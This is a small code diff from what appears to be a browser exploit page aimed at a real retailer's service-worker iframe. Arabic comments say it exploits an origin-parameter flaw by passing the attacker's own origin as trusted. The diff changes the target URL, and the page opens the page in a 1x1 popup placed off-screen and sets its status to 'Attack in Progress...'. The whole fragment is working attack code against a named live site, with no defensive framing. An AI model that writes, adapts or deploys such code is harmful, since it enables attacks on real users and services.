@@ -23,7 +23,7 @@
             log("Opening Targeted Popup...");
             // نفتح صفحة الجسر التي بها ثغرة الـ Origin Parameter
             // نمرر رابط صفحتنا كـ "Origin" موثوق
-            const targetUrl = "https://stm.zooplus.com/sw_iframe.html?origin=" + encodeURIComponent(window.location.origin);
+            const targetUrl = "https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=" + encodeURIComponent(window.location.origin);
             const popup = window.open(targetUrl, "zooplus_bridge", "width=1,height=1,left=-1000,top=-1000");
 
             status.innerText = "Attack in Progress...";
